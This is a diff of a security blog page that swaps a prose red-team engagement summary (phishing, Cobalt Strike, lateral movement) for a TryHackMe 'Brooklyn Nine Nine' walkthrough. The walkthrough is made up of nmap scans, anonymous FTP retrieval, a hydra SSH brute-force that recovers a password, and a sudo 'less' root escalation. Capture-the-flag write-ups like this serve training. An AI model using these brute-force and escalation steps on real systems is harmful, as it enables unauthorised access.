@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FinTech Red Team Engagement | Technical Intelligence Labs</title>
+    <title>Brooklyn Nine Nine | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,53 +106,99 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">ethical-hacking</span>
-                <span>// 2025-12-30</span>
-                <span>// ID: REF-FinTech Red Team Engagement</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Brooklyn Nine Nine</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">FinTech Red Team Engagement</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Brooklyn Nine Nine</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- ['red teaming', 'fintech security', 'APT simulation', 'spear-phishing', 'lateral movement', 'domain compromise', 'cobalt strike', 'ethical hacking'] -->
+                <!-- tryhackme -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h1>FinTech Red Team Engagement Report</h1>
-<h2>Introduction</h2>
-<p>This report details a full-scope Red Team operation conducted against a prominent digital bank. The engagement was designed to simulate the tactics, techniques, and procedures (TTPs) of an Advanced Persistent Threat (APT) group, with the primary objective of assessing the organization's resilience against sophisticated cyberattacks. The operation aimed to achieve domain compromise, evaluating the security controls, detection capabilities, and incident response processes of the target environment. The project also served as a practical exploration of advanced ethical hacking methodologies.</p>
-<h2>Reconnaissance</h2>
-<p>Initial intelligence gathering focused on open-source information (OSINT) to identify key personnel, organizational structures, and potential technological footprints relevant to the target digital bank. This phase aimed to build a comprehensive profile of the target environment, identifying potential entry points and suitable candidates for social engineering attacks. Specific attention was paid to identifying email address formats and publicly available employee information to craft credible spear-phishing lures.</p>
-<h2>Enumeration</h2>
-<p>Following the reconnaissance phase, targeted enumeration was conducted to further refine potential attack vectors. This involved analyzing identified employee profiles and external-facing infrastructure for any vulnerabilities or misconfigurations that could facilitate initial access. The data collected was critical for tailoring subsequent exploitation attempts, particularly for crafting highly personalized and convincing spear-phishing emails.</p>
-<h2>Exploitation</h2>
-<p>The primary method for gaining initial access was a meticulously planned spear-phishing campaign. Tailored emails, designed to bypass existing email security controls and exploit human factors, were sent to identified targets within the organization.</p>
-<h3>Initial Access &amp; Command and Control (C2) Establishment</h3>
-<p>Upon successful execution of a malicious payload by a target, initial access was gained on a user workstation. A sophisticated command and control (C2) channel was established utilizing <strong>Cobalt Strike</strong>. Cobalt Strike's beacon functionality provided a robust and covert communication pathway for subsequent post-exploitation activities, allowing for remote code execution, file transfers, and system information gathering without raising immediate suspicion.</p>
-<h2>Privilege Escalation &amp; Lateral Movement</h2>
-<p>With initial access established, the focus shifted to escalating privileges on the compromised host and then moving laterally within the network to reach high-value assets, specifically the domain controllers.</p>
-<h3>Local Privilege Escalation</h3>
-<p>Techniques were employed to escalate privileges on the initial foothold, moving from a standard user context to administrative or system-level access. This critical step enabled broader access to local resources and the ability to extract credentials or execute privileged operations necessary for lateral movement.</p>
-<h3>Lateral Movement</h3>
-<p>Leveraging the elevated privileges and collected credentials, various lateral movement techniques were executed to navigate deeper into the target's internal network. This involved:<br />
-*   <strong>Pass-the-Hash/Ticket</strong>: Reusing compromised NTLM hashes or Kerberos tickets to authenticate to other systems.<br />
-*   <strong>Service Creation/Modification</strong>: Installing or modifying services on remote machines to execute code.<br />
-*   <strong>Remote Code Execution (WMI/PsExec)</strong>: Utilizing administrative tools to execute commands remotely.</p>
-<p>Through a systematic approach, the Red Team mapped critical network segments and identified pathways leading to the domain controllers.</p>
-<h3>Domain Controller Compromise</h3>
-<p>The culmination of the lateral movement phase was the successful compromise of the organization's domain controllers. This provided full control over the Active Directory environment, signifying a complete breach of the target's core identity management system. The compromise demonstrated the potential for an APT to establish persistent access and exert extensive control over the entire enterprise network.</p>
-<h2>Conclusion</h2>
-<p>This Red Team engagement successfully demonstrated the ability of a simulated APT group to compromise the domain controllers of a digital bank. The operation highlighted critical vulnerabilities in the organization's security posture, specifically regarding its susceptibility to spear-phishing attacks and the effectiveness of its internal network segmentation and detection capabilities.</p>
-<p>Key achievements include:<br />
-*   Successful initial access via a sophisticated spear-phishing campaign.<br />
-*   Effective deployment and utilization of <strong>Cobalt Strike</strong> for C2 operations and post-exploitation.<br />
-*   Demonstrated expertise in complex <strong>Red Teaming</strong> methodologies, including privilege escalation and advanced lateral movement techniques.<br />
-*   Validation of an attack path leading to full domain compromise, mimicking real-world APT TTPs.</p>
-<p>The detailed findings of this engagement have been thoroughly documented in a comprehensive technical report, providing actionable recommendations for strengthening the digital bank's security defenses against advanced persistent threats.</p>
+<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.153.193
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 3 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<pre class="codehilite"><code>ftp 10.67.135.75 
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+ftp&gt; get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+100% |*************************************************************************************************************|   119        3.33 MiB/s    00:00 ETA
+
+cat note_to_jake.txt
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+</code></pre>
+
+<pre class="codehilite"><code>hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.67.135.75
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-01 03:58:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[DATA] attacking ssh://10.67.135.75:22/
+[22][ssh] host: 10.67.135.75   login: jake   password: 987654321
+^C                                                                                                                                                        
+</code></pre>
+
+<pre class="codehilite"><code>jake@brookly_nine_nine:/home/holt$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+jake@brookly_nine_nine:/home/holt$ sudo /usr/bin/less /etc/hosts
+root@brookly_nine_nine:/home/holt# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
         </div>
     </main>
 
